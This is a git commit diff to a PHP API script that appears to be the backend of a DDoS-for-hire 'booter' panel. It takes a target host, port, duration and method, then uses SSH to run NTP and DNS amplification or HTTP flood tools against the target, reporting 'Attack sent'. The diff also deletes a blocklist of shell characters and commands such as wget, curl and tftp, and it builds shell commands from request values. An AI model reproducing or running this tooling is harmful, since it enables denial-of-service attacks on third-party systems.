636245228d5000807186e4490bc9c07991d4ddcd
forkyyy <67451588+forkyyy@users.noreply.github.com>
2021-11-12 02:31:39 -0300

    Update api.php

--- api.php
+++ api.php
@@ -20,24 +20,19 @@
 
     $key = $_GET["key"];
 
-    if (empty($host) | empty($port) | empty($time) | empty($method))  //Checking the fields
+    if (empty($host) | empty($port) | empty($time) | empty($method)) //Checking the fields
     {
         die("Please verify all fields");
     }
 
-    $parameters = array("$", "{", "|", "<", ";", "echo", "wget", "curl", "tftp");
-
-    foreach ($parameters as $parameter) 
+    if (!is_numeric($port) || !is_numeric($time)) 
     {
-        if (strpos($host, $parameter) || strpos($method, $parameter) || !is_numeric($port) || !is_numeric($time)) 
-        {
-            die('Unsafe chars!');
-        }
+        die('Time and Port must be a number');
     }
-    
-    if (!filter_var($host, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) && !filter_var($host, FILTER_VALIDATE_URL))
+  
+    if (!filter_var($host, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) && !filter_var($host, FILTER_VALIDATE_URL)) //Validating target
     {
-        die('The request could not be successful, please insert a correct IP address(v4)/URL..');
+        die('Please insert a correct IP address(v4)/URL..');
     }
 
     if($port < 1 && $port > 65535) //Validating port
@@ -47,43 +42,29 @@
 
     if ($time < 1) //Validating time
     {
-        die("Time is invalid!");
+        die("Time is invalid");
     }
 
-    if (!in_array($method, $Methods))  //Validating method
+    if (!in_array($method, $Methods)) //Validating method
     {
-        die("Method is invalid!");
+        die("Method is invalid");
     }
     
     if ($key !== $APIKey) //Validating API Key
     { 
-        die("Invalid API Key!");
+        die("Invalid API Key");
     }
 
-    function send()
+    $connection = ssh2_connect($address, $serverPort);
+    if(ssh2_auth_password($connection, $user, $password))
     {
-        global $method;
-        global $methods;
-        global $address;
-        global $serverPort;
-        global $user;
-        global $password;
-        global $time;
-        global $host;
-        global $port;
-
-        $connection = ssh2_connect($address, $serverPort);
-        if(ssh2_auth_password($connection, $user, $password))
-        {
-            if($method == "NTP"){if(ssh2_exec($connection, "screen -dm -S $host timeout $time ./NTP $host $port ntp.list 2 300000 $time")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}
-            if($method == "DNS"){if(ssh2_exec($connection, "screen -dm -S $host timeout $time ./NTP $host $port dns.list 2 300000 $time")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}
-            if($method == "HTTP"){if(ssh2_exec($connection, "screen -dm timeout $time node http.js $host $time /dev/null")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}
-            if($method == "stop"){if(ssh2_exec($connection, "pkill -f $host | screen -X -S $host quit")){echo "Attack stopped on $host!";}else{die("Ran into a error");}}      
-        }
-        else
-        {
-            die("Could not login to remote server, this may be a error with the login credentials.");
-        }
+        if($method == "NTP"){if(ssh2_exec($connection, "screen -dm -S $host timeout $time ./NTP $host $port ntp.list 2 300000 $time")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}
+        if($method == "DNS"){if(ssh2_exec($connection, "screen -dm -S $host timeout $time ./DNS $host $port dns.list 2 300000 $time")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}
+        if($method == "HTTP"){if(ssh2_exec($connection, "screen -dm timeout $time node http.js $host $time")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}
+        if($method == "stop"){if(ssh2_exec($connection, "pkill -f $host")){echo "Attack stopped on $host!";}else{die("Ran into a error");}}      
     }
-    send();
+    else
+    {
+        die("Could not login to remote server, this may be a error with the login credentials.");
+    }
 ?>
